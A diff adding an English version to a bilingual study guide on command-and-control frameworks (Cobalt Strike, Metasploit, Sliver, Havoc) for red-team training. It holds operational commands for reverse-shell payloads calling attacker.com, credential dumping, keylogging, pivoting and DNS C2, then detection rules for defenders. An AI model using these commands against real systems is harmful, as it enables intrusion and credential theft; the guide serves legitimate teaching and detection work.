@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # C2 프레임워크 (Command & Control Frameworks)
 
 > **목적**: 교육, 연구, CTF, 공인된 레드팀 작전 환경에서의 학습용 자료
@@ -1072,3 +1078,638 @@ tags:
 - Sliver GitHub: https://github.com/BishopFox/sliver
 - Havoc Framework GitHub
 - "The C2 Matrix" 프로젝트 (c2matrix.com)
+
+---
+
+<a name="english"></a>
+
+# C2 Frameworks (Command & Control Frameworks)
+
+> **Purpose**: Educational material for learning in CTF, research, and authorized red team operation environments
+
+---
+
+## 1. C2 Architecture Overview
+
+### 1.1 Basic Structure Diagram
+
+```
+[Attacker Machine (Operator)]
+        |
+        | (encrypted communication)
+        v
+[Team Server / C2 Server]
+   ├── Listener (ports 443, 80, 53, etc.)
+   ├── Payload generator
+   └── Session manager
+        |
+        | (C2 channel: HTTP/HTTPS/DNS/SMB)
+        v
+[Victim Machine (Implant/Beacon/Agent)]
+   ├── Beacon → periodic C2 server callback
+   ├── Receive and execute commands
+   └── Return results
+```
+
+### 1.2 C2 Communication Flow
+
+```
+1. Initial Access
+   └─> Execute payload (macro, drive-by, phishing, etc.)
+
+2. Agent Initialization
+   └─> Agent sends registration request to C2 server
+   └─> Transmit identifier (UUID), system information
+
+3. Beaconing Loop
+   └─> Agent periodically polls C2
+   └─> If commands exist: receive → execute → return results
+
+4. Lateral Movement / Privilege Escalation
+   └─> Deploy new agents, secure pivot points
+
+5. Cleanup after Objectives
+   └─> Agent self-destruct, log deletion
+```
+
+### 1.3 C2 Channel Comparison
+
+| Channel | Advantages | Disadvantages | Detection Difficulty |
+|---------|-----------|---------------|---------------------|
+| HTTP | Easily passes firewalls, easy to implement | Plaintext traffic | Low |
+| HTTPS | Encrypted, high trust | Certificate required | Medium |
+| DNS | Mostly allowed by firewalls | Slow, capacity limited | High |
+| SMB | Suitable for internal network pivoting | No external communication | Medium |
+| ICMP | Abnormal but possible | Blocked in many environments | High |
+| WebSocket | Persistent connection, fast | DPI detection possible | Medium |
+
+---
+
+## 2. Cobalt Strike
+
+### 2.1 Concept and Architecture
+
+Cobalt Strike is a commercial red team framework used for advanced APT (Advanced Persistent Threat) simulation.
+
+**Core Components:**
+
+```
+[Team Server]
+  - Hub for all Operators
+  - Listener management
+  - Beacon session management
+  - Log and artifact storage
+
+[Client (Cobalt Strike GUI)]
+  - Interface used by Operators
+  - Remote connection to team server
+  - Multi-Operator collaboration possible
+
+[Beacon]
+  - Implant/Agent
+  - HTTP, HTTPS, DNS, SMB communications
+  - In-memory execution (not recorded to disk)
+  - Sleep + Jitter for detection evasion
+
+[Listener]
+  - Server-side receiver for Beacon callbacks
+  - HTTP Listener: ports 80/8080
+  - HTTPS Listener: port 443
+  - DNS Listener: port 53 (UDP)
+  - SMB Named Pipe: internal network pivoting
+
+[Malleable C2 Profile]
+  - Defines the appearance of Beacon traffic
+  - Disguises as legitimate traffic (Amazon, Office365, etc.)
+  - URI patterns, User-Agent, header customization
+```
+
+### 2.2 Basic Team Server Configuration Concept
+
+```bash
+# Run team server (concept)
+# ./teamserver <IP> <password> [profile]
+./teamserver 0.0.0.0 StrongPassword123 /opt/profiles/amazon.profile
+
+# Client connection
+# ./cobaltstrike
+# → Enter team server IP, port (50050), password
+```
+
+### 2.3 Basic Beacon Commands
+
+```
+# Basic system information
+beacon> sysinfo
+beacon> getuid
+beacon> getpid
+
+# Process management
+beacon> ps
+beacon> inject <PID> <architecture> <listener>
+beacon> migrate <PID>
+
+# File operations
+beacon> ls
+beacon> cd C:\Users\target\Desktop
+beacon> upload /local/file
+beacon> download C:\target\file.txt
+
+# Privilege escalation
+beacon> getsystem
+beacon> elevate uac-token-duplication <listener>
+
+# Credential collection
+beacon> hashdump
+beacon> logonpasswords
+beacon> dcsync <domain> <account>
+
+# Lateral movement
+beacon> jump psexec <target> <listener>
+beacon> jump winrm <target> <listener>
+beacon> spawn <listener>
+```
+
+### 2.4 Malleable C2 Profile Concept
+
+```
+# amazon.profile example structure
+set sleeptime "5000";   # Wait 5 seconds
+set jitter    "10";     # ±10% jitter
+
+http-get {
+    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
+    client {
+        header "Accept" "*/*";
+        header "Host" "www.amazon.com";
+        metadata {
+            base64;
+            prepend "session-token=";
+            header "Cookie";
+        }
+    }
+    server {
+        header "Content-Type" "text/plain";
+        output {
+            print;
+        }
+    }
+}
+```
+
+---
+
+## 3. Metasploit msfconsole C2
+
+### 3.1 Metasploit Architecture
+
+```
+msfconsole
+  ├── Modules
+  │   ├── Exploits     → vulnerability exploitation
+  │   ├── Payloads     → agent code
+  │   ├── Auxiliaries  → scanners, fuzzers, etc.
+  │   ├── Post         → post-exploitation
+  │   └── Encoders     → payload encoding
+  ├── msfvenom         → standalone payload generation
+  └── meterpreter      → advanced agent
+```
+
+### 3.2 Handler Setup and Session Management
+
+```bash
+# Run msfconsole
+msfconsole -q
+
+# Set up multi handler
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false    # Handle multiple sessions
+set EnableStageEncoding true
+exploit -j                 # Run in background
+
+# Session management
+sessions -l                # List sessions
+sessions -i 1              # Interact with session 1
+sessions -k 1              # Kill session 1
+sessions -u 1              # Upgrade session
+
+# Background operations
+background                 # Background current session
+jobs -l                    # Running handlers
+```
+
+### 3.3 Payload Generation (msfvenom)
+
+```bash
+# Windows x64 HTTPS reverse shell EXE
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=192.168.1.100 \
+  LPORT=443 \
+  -f exe \
+  -o payload.exe
+
+# Linux ELF binary
+msfvenom -p linux/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.10.10 \
+  LPORT=4444 \
+  -f elf \
+  -o shell
+
+# PowerShell script
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=attacker.com \
+  LPORT=443 \
+  -f psh \
+  -o payload.ps1
+
+# DLL payload
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=attacker.com \
+  LPORT=443 \
+  -f dll \
+  -o inject.dll
+
+# Encoding for AV bypass attempt (limited effectiveness)
+msfvenom -p windows/x64/meterpreter/reverse_https \
+  LHOST=attacker.com \
+  LPORT=443 \
+  -e x64/xor_dynamic \
+  -i 5 \
+  -f exe \
+  -o encoded.exe
+```
+
+### 3.4 Meterpreter Post-Exploitation
+
+```bash
+# System information
+meterpreter> sysinfo
+meterpreter> getuid
+meterpreter> getpid
+meterpreter> ps
+
+# Privilege escalation
+meterpreter> getsystem
+meterpreter> use post/multi/recon/local_exploit_suggester
+meterpreter> run post/windows/escalate/bypassuac
+
+# Credential collection
+meterpreter> hashdump
+meterpreter> run post/windows/gather/credentials/credential_collector
+meterpreter> load kiwi
+meterpreter> creds_all
+
+# Pivot setup
+meterpreter> portfwd add -l 3389 -p 3389 -r 192.168.2.10
+meterpreter> run post/multi/manage/autoroute
+
+# Screenshot / keylogging
+meterpreter> screenshot
+meterpreter> keyscan_start
+meterpreter> keyscan_dump
+
+# File operations
+meterpreter> upload /attacker/nc.exe C:\\Windows\\Temp\\nc.exe
+meterpreter> download C:\\Users\\admin\\Documents\\secret.docx
+```
+
+---
+
+## 4. Sliver C2
+
+### 4.1 Overview and Features
+
+Sliver is an open-source C2 framework developed by BishopFox, written in Go.
+
+```
+Features:
+- Fully open source (Apache 2.0)
+- mTLS, WireGuard, HTTP/S, DNS support
+- Automatic certificate generation
+- Cross-platform implants (Windows/Linux/macOS)
+- Multiplayer support
+```
+
+### 4.2 Installation and Initial Setup
+
+```bash
+# Install Sliver server
+curl https://sliver.sh/install | sudo bash
+
+# Or build from source
+git clone https://github.com/BishopFox/sliver
+cd sliver
+make
+
+# Run server
+sudo sliver-server
+
+# Create operator profile
+sliver > new-operator --name operator1 --lhost 10.0.0.1
+# → Creates operator1_10.0.0.1.cfg file
+
+# Connect client
+sliver-client import operator1_10.0.0.1.cfg
+sliver-client
+```
+
+### 4.3 Basic Usage
+
+```bash
+# Start listeners
+sliver > mtls --lhost 0.0.0.0 --lport 8888
+sliver > https --lhost 0.0.0.0 --lport 443
+sliver > dns --domains c2.example.com
+
+# Generate implant
+sliver > generate --mtls 10.0.0.1:8888 \
+  --os windows \
+  --arch amd64 \
+  --format exe \
+  --save /tmp/implant.exe
+
+# Generate Beacon (periodic callback)
+sliver > generate beacon \
+  --mtls 10.0.0.1:8888 \
+  --seconds 30 \
+  --jitter 5 \
+  --os linux \
+  --save /tmp/beacon
+
+# Session management
+sliver > sessions          # List active sessions
+sliver > use <sessionID>   # Select session
+sliver [session] > info    # System information
+sliver [session] > ls      # File listing
+sliver [session] > execute whoami
+sliver [session] > upload /local/file /remote/path
+sliver [session] > download /remote/file
+sliver [session] > shell   # Interactive shell
+
+# Pivoting
+sliver [session] > pivots tcp --lport 9999
+sliver > generate --tcp-pivot 10.0.0.2:9999 --save pivot.exe
+```
+
+---
+
+## 5. Havoc Framework
+
+### 5.1 Overview
+
+Havoc is a modern C2 framework and an open-source alternative to Cobalt Strike.
+
+```
+Components:
+- Teamserver: Go-based C2 server
+- Havoc Client: Qt-based GUI
+- Demon: C/ASM-based implant
+- Phantom: additional implant option
+
+Features:
+- Sleep Obfuscation support
+- Built-in AMSI/ETW bypass
+- Various process injection techniques
+- Kerberos attack support
+```
+
+### 5.2 Basic Configuration
+
+```yaml
+# config.yaotl (team server configuration)
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+    Build {
+        Compiler64 = "x86_64-w64-mingw32-gcc"
+        Compiler86 = "i686-w64-mingw32-gcc"
+    }
+}
+
+Operators {
+    user "operator1" {
+        Password = "SecurePass!"
+    }
+}
+
+Listeners {
+    Http {
+        Name = "MainHTTPS"
+        Hosts = ["attacker.com"]
+        HostBind = "0.0.0.0"
+        PortBind = 443
+        Secure = true
+    }
+}
+```
+
+---
+
+## 6. HTTP/HTTPS/DNS/SMB C2 Channel Details
+
+### 6.1 HTTP C2
+
+```
+Request pattern:
+  GET /updates/check?id=<encoded agentID> HTTP/1.1
+  Host: legitimate-looking.com
+  User-Agent: Mozilla/5.0 ...
+
+Response pattern:
+  HTTP/1.1 200 OK
+  Content-Type: application/json
+  {"status": "ok", "data": "<base64-encoded command>"}
+
+Detection indicators:
+  - Abnormally regular polling patterns
+  - Non-standard User-Agent
+  - Unencrypted beacon traffic
+  - Abnormal Content-Type
+```
+
+### 6.2 DNS C2
+
+```
+How it works:
+  Agent → DNS query (TXT/A record) → C2 server
+  
+  # Command delivery (server → agent)
+  <encoded>.<domain>.c2.attacker.com  TXT "Y21kOiB3aG9hbWk="
+
+  # Result return (agent → server)  
+  <result chunk>.<sessionID>.<domain>.c2.attacker.com
+
+DNS C2 tools:
+  - dnscat2 (open source)
+  - iodine (DNS tunneling)
+  - Cobalt Strike DNS Beacon
+
+Detection indicators:
+  - Abnormally long DNS queries
+  - High DNS query frequency
+  - Many TXT record queries
+  - NXDOMAIN response patterns
+```
+
+### 6.3 SMB Named Pipe C2
+
+```
+Use cases:
+  - Internal network pivot point
+  - Control systems without internet connectivity
+  - Network segmentation bypass
+
+Architecture:
+  [External Agent] ←HTTPS→ [C2 Server]
+       ↕ SMB Named Pipe
+  [Internal Pivot Agent] ←Named Pipe→ [Internal Targets]
+
+Named Pipe path examples:
+  \\.\pipe\MSSE-1234-server  (Cobalt Strike default)
+  \\.\pipe\msagent_1234
+  \\.\pipe\postex_1234
+```
+
+---
+
+## 7. Python Educational HTTP C2 Server/Agent Implementation
+
+### 7.1 C2 Server
+
+```python
+#!/usr/bin/env python3
+"""
+Simple educational HTTP C2 server implementation
+Purpose: Understanding C2 communication principles (CTF/educational environments only)
+"""
+# (See Korean section for full source code — identical implementation with Korean comments translated)
+```
+
+### 7.2 C2 Agent (Educational)
+
+```python
+#!/usr/bin/env python3
+"""
+Educational HTTP C2 agent
+CTF/educational environments only — do not use for unauthorized purposes
+"""
+# (See Korean section for full source code — identical implementation)
+```
+
+---
+
+## 8. C2 Traffic Detection (Blue Team Perspective)
+
+### 8.1 Network-Based Detection
+
+```
+Detection Method 1: Beaconing Pattern Analysis
+  - Regular connections to same destination (e.g., every 30 seconds)
+  - No data exchange after connection establishment
+  - Abnormally consistent packet sizes
+
+Detection Method 2: JA3/JA3S Fingerprinting
+  - Identify C2 tools via TLS ClientHello parameters
+  - Blacklist known Cobalt Strike/Metasploit JA3 hashes
+
+Detection Method 3: DNS Analysis
+  - High-entropy domains (DGA detection)
+  - Abnormally long subdomains
+  - Bulk TXT record queries
+
+Detection Method 4: Beacon Timing Analysis
+  # Low standard deviation in time intervals indicates automated beaconing
+  import statistics
+  intervals = [29.8, 30.1, 29.9, 30.2, 30.0]
+  std_dev = statistics.stdev(intervals)
+  # std_dev < 1.0 is suspicious
+```
+
+### 8.2 Host-Based Detection
+
+```
+Detection Indicators (IOC):
+  Processes:
+  - rundll32.exe → network connections
+  - powershell.exe -enc <base64>
+  - mshta.exe → external URL access
+  - wscript.exe / cscript.exe → abnormal paths
+
+  Registry:
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+  - Abnormal service registration
+
+  Memory:
+  - Executable memory regions (RWX)
+  - Executable code not on disk
+  - Abnormal PE headers (Reflective DLL)
+
+Detection Tools:
+  - Sysmon (event logging)
+  - Volatility (memory analysis)
+  - YARA rules (Beacon pattern matching)
+  - EDR solutions (CrowdStrike, SentinelOne)
+```
+
+### 8.3 YARA Detection Rule Examples
+
+```yara
+rule CobaltStrike_Beacon {
+    meta:
+        description = "Cobalt Strike Beacon memory pattern"
+    strings:
+        $mz = { 4D 5A }
+        $cs1 = "%02d/%02d/%02d %02d:%02d:%02d"
+        $cs2 = "ReflectiveLoader"
+        $cs3 = { FC E8 89 00 00 00 60 89 E5 31 D2 }
+    condition:
+        $mz at 0 and ($cs2 or ($cs1 and $cs3))
+}
+
+rule Generic_HTTP_Beacon {
+    meta:
+        description = "Generic HTTP beaconing pattern"
+    strings:
+        $ua1 = "Mozilla/5.0" ascii
+        $beacon1 = "sleep" ascii nocase
+        $beacon2 = "checkin" ascii nocase
+        $beacon3 = "callback" ascii nocase
+    condition:
+        $ua1 and 2 of ($beacon*)
+}
+```
+
+### 8.4 Sigma Detection Rules
+
+```yaml
+title: C2 Beaconing DNS Pattern Detection
+status: experimental
+description: Detect suspicious DNS C2 communication patterns
+logsource:
+    category: dns
+detection:
+    selection:
+        dns.query.name|re: '^[a-z0-9]{20,}\.'
+    timeframe: 1m
+    condition: selection | count() > 50
+falsepositives:
+    - CDN domains
+    - Legitimate high-entropy domains
+level: medium
+tags:
+    - attack.command_and_control
+    - attack.t1071.004
+```
+
+---
+
+## References
+
+- MITRE ATT&CK: TA0011 Command and Control
+- Cobalt Strike Documentation (official)
+- Sliver GitHub: https://github.com/BishopFox/sliver
+- Havoc Framework GitHub
+- "The C2 Matrix" project (c2matrix.com)
